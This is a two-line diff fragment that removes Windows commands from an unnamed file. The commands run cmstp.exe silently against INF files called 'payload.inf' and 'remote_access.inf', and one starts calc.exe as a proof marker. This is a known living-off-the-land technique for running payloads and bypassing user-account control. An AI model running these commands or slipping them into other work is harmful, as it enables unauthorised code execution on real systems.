@@ -1,2 +1,0 @@
-cmstp.exe /s /ni /au C:\Users\Public\payload.inf & start /b calc.exe
-cmstp.exe /s C:\Users\Public\remote_access.inf
